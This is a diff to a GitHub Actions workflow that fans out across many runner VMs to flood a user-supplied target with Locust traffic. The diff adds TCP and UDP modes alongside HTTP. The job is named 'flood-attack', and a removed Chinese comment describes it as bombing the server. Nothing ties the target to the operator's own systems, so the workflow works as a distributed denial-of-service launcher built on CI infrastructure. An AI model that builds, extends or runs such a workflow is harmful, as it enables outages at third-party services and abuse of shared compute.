@@ -4,24 +4,32 @@ on:
   workflow_dispatch:
     inputs:
       target_url:
-        description: '1. 目标 URL (例如: https://api.yourdomain.com)'
+        description: '1. 目标地址 (HTTP模式填URL, TCP/UDP填 IP:端口)'
         required: true
         default: 'https://example.com'
+      protocol_type:
+        description: '2. 选择测试协议类型 (选项卡)'
+        required: true
+        default: 'http'
+        type: choice
+        options:
+          - http
+          - tcp
+          - udp
       threads_per_shard:
-        description: '2. 每个分片的请求线程数'
+        description: '3. 每个分片的请求线程数'
         required: true
         default: '100'
       shard_count:
-        description: '3. 分片数量 (将启动对应数量的虚拟机)'
+        description: '4. 分片数量 (将启动对应数量的虚拟机)'
         required: true
         default: '15'
       run_time_minutes:
-        description: '4. 请求时间 (单位: 分钟)'
+        description: '5. 请求时间 (单位: 分钟)'
         required: true
         default: '5'
 
 jobs:
-  # 任务一：根据输入的 shard_count 动态生成矩阵数组
   generate-matrix:
     runs-on: ubuntu-latest
     outputs:
@@ -30,18 +38,15 @@ jobs:
       - id: set-matrix
         run: |
           SHARD_COUNT=${{ github.event.inputs.shard_count }}
-          # 使用 Python 生成类似 [1, 2, 3, ..., N] 的 JSON 数组
           JSON_ARRAY=$(python3 -c "import json; print(json.dumps(list(range(1, $SHARD_COUNT + 1))))")
           echo "matrix_array=$JSON_ARRAY" >> $GITHUB_OUTPUT
 
-  # 任务二：读取矩阵，真正开始轰炸服务器
   flood-attack:
     needs: generate-matrix
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # 动态接收来自上一个任务的数组
         shard: ${{ fromJson(needs.generate-matrix.outputs.matrix_array) }}
 
     steps:
@@ -54,14 +59,16 @@ jobs:
           python-version: '3.10'
 
       - name: Install Locust
-        run: pip install locust==2.32.2
+        run: pip install locust==2.32.2 requests
 
       - name: Fire Requests - Shard ${{ matrix.shard }}
         run: |
-          # 瞬间拉满线程数并持续指定分钟
+          # 将 GitHub 选项卡中选择的协议通过环境变量传递给 python 脚本
+          export PROTOCOL="${{ github.event.inputs.protocol_type }}"
+          
           locust -f 1.py \
             --headless \
             -u ${{ github.event.inputs.threads_per_shard }} \
             -r ${{ github.event.inputs.threads_per_shard }} \
             --run-time ${{ github.event.inputs.run_time_minutes }}m \
-            --host ${{ github.event.inputs.target_url }}
+            --host "${{ github.event.inputs.target_url }}"
